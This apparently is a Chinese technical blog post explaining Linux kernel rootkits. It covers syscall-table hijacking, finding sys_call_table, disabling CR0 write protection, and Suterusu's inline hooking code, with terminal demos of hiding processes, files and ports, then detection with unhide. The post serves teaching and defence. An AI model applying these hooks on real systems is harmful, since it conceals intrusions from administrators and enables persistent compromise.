---
title: Linux Rootkits
date: 2018-02-07 20:58:52
categories:
- Security
tags:
- rootkits
---

成功入侵系统后，入侵者一般会通过Rootkits工具来隐藏行踪，提供后门方便后续入侵访问。Rootkits一般会隐藏文件，隐藏进程，隐藏网络端口，过滤日志，总之会隐藏任何未授权行为，使入侵者的活动很难被检测到，入侵者可以持续掌控受害系统。

Rootkits的实现手段多种多样，从应用层到动态链接库层，再到内核层，甚至Hypervisor层，都有各种方法实现Rootkits。在应用层直接替换二进制文件如`ls`、`ps`、`top`、`netstat`等，在动态连接库层Hook库函数如`open()`、`opendir()`、`readdir()`、`unlink()`等，在内核层Hook系统调用及内核函数，更改内核行为。

<!-- more -->

![linux kernel attacks](http://7xtc3e.com1.z0.glb.clouddn.com/linux-rootkits/kernel-attacks.png)

从上图可以看出，进程执行流程中的每一步都有可能可能被利用来控制执行行为，本篇博客重点关注内核层。

内核层最简单的Hook方式是直接将系统调用替换：

``` c
saved_syscall = sys_call_table[SYSCALL_NUMBER];
sys_call_table[SYSCALL_NUMBER] = new_syscall;
```

在内核2.6版本之前，`sys_call_table`是导出符号，可直接引用，在新版内核，该符号不再导出，要替换系统调用，得先找到`sys_call_table`符号地址，方法有很多，如在System.map符号文件中查找；在/proc/kallsyms中查找；在内存中暴力搜索导出的系统调用如`sys_close`，`sctable[__NR_close] == (unsigned *) sys_close`，`sctable`即`sys_call_table`地址；在系统调用入口处`entry_SYSCALL_64`搜索`call`指令`ff 14 c5`，其操作数即`sys_call_table`地址。另外还要解决的一个问题是内存写保护，通过清理`CR0`寄存器的写保护位，使只读页可写，进而可更改`sys_call_table`。

另外一种Hook技术Inline Hooking，不但可以Hook系统调用，还可Hook内核函数，该方法直接修改目标函数指令，跳转到自定义函数。这种技术也是Rootkits [Suterusu](https://github.com/consen/suterusu)用到的Hook技术，Suterusu的Hook框架相当优美，很值得学习。

如在x64系统下，将目标函数指令替换成`mov rax, $addr; jmp rax`，这样执行到目标函数时，会先跳转到自定义函数地址`$addr`执行，执行过程中如需要调用原始目标函数，会将目标函数指令恢复成原始指令调用。

``` c
void hijack_start ( void *target, void *new )
{
    struct sym_hook *sa;
    unsigned char o_code[HIJACK_SIZE], n_code[HIJACK_SIZE];

    #if defined(_CONFIG_X86_)
    unsigned long o_cr0;

    // push $addr; ret
    memcpy(n_code, "\x68\x00\x00\x00\x00\xc3", HIJACK_SIZE);
    *(unsigned long *)&n_code[1] = (unsigned long)new;
    #elif defined(_CONFIG_X86_64_)
    unsigned long o_cr0;

    // mov rax, $addr; jmp rax
    memcpy(n_code, "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0", HIJACK_SIZE);
    *(unsigned long *)&n_code[2] = (unsigned long)new;
    #endif

    DEBUG_HOOK("Hooking function 0x%p with 0x%p\n", target, new);

    memcpy(o_code, target, HIJACK_SIZE);

    o_cr0 = disable_wp();
    memcpy(target, n_code, HIJACK_SIZE);
    restore_wp(o_cr0);

    sa = kmalloc(sizeof(*sa), GFP_KERNEL);
    if ( ! sa )
        return;

    sa->addr = target;
    memcpy(sa->o_code, o_code, HIJACK_SIZE);
    memcpy(sa->n_code, n_code, HIJACK_SIZE);

    list_add(&sa->list, &hooked_syms);
}
```

有了Hook框架，Rootkits的一些操作就很容易实现了。

- **隐藏进程**

Hook procfs中`/proc` file_operations的`iterate_shared()`，替换`filldir()`，隐藏指定PID进程。

```
$ ps -ef | grep Simple
14549     2011  3482  0 20:21 pts/4    00:00:00 python2.7 -m SimpleHTTPServer
14549     2014 27349  0 20:21 pts/9    00:00:00 grep Simple
$ ./sock 1 2011
Hiding PID 2011
$ ps -ef | grep Simple
14549     2036 27349  0 20:22 pts/9    00:00:00 grep Simple
$ ./sock 2 2011
Unhiding PID 2011
$ ps -ef | grep Simple
14549     2011  3482  0 20:21 pts/4    00:00:00 python2.7 -m SimpleHTTPServer
14549     2039 27349  0 20:22 pts/9    00:00:00 grep Simple
```

- **隐藏文件**

Hook当前文件系统file_operations的`iterate_shared()`，替换`filldir()`，隐藏指定文件和目录。

```
$ ls *.c
dlexec.c  hookrw.c  icmp.c  keylogger.c  main.c  module.c  serve.c  sock.c  suterusu.mod.c  util.c
$ ./sock 11 sock.c
Hiding file/dir sock.c
$ ls *.c
dlexec.c  hookrw.c  icmp.c  keylogger.c  main.c  module.c  serve.c  suterusu.mod.c  util.c
$ ./sock 12 sock.c
Unhiding file/dir sock.c
$ ls *.c
dlexec.c  hookrw.c  icmp.c  keylogger.c  main.c  module.c  serve.c  sock.c  suterusu.mod.c  util.c
```

- **隐藏端口**

以隐藏tcp4端口为例，Hook procfs中`/proc/net/tcp` seq_operations的`show()`，隐藏指定端口。

```
$ netstat -anp | grep 8000
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:8000                0.0.0.0:*                   LISTEN      2011/python2.7
$ ./sock 3 8000
Hiding TCPv4 port 8000
$ netstat -anp | grep 8000
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
$ ./sock 4 8000
Unhiding TCPv4 port 8000
$ netstat -anp | grep 8000
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:8000                0.0.0.0:*                   LISTEN      2011/python2.7
```

检测隐藏进程和端口，可以借助工具[unhide](http://www.unhide-forensics.info/?Linux)。

- **检测隐藏进程**

```
$ sudo unhide proc
Used options: 
[*]Searching for Hidden processes through /proc stat scanning

Found HIDDEN PID: 2011
```

unhide通过暴力枚举`/proc`下进程，检测隐藏进程。

- **检测隐藏端口**

```
$ sudo unhide-tcp -s
Used options: use_quick 
[*]Starting TCP checking

Found Hidden port that not appears in ss: 8000
[*]Starting UDP checking
```

unhide-tcp通过暴力枚举连接端口，检测隐藏端口。

参考：

- [Wikipedia Rootkit](https://en.wikipedia.org/wiki/Rootkit)
- [Subverting the Linux Kernel](http://eisen.io/slides/jeyu_linux_kernel_rootkits_osseu2017.pdf)
- [Horse Pill -- A New Kind of Linux Rootkit](https://www.blackhat.com/docs/us-16/materials/us-16-Leibowitz-Horse-Pill-A-New-Type-Of-Linux-Rootkit.pdf)
- [Linux Kernel Rootkits](https://www.la-samhna.de/library/rootkits/index.html)
- [Rootkits - Detection and Prevention](https://fenix.tecnico.ulisboa.pt/downloadFile/395137904119/dissertacao.pdf)
- [Suterusu](https://github.com/mncoppola/suterusu/)
- [Research Rootkit](https://github.com/NoviceLive/research-rootkit)
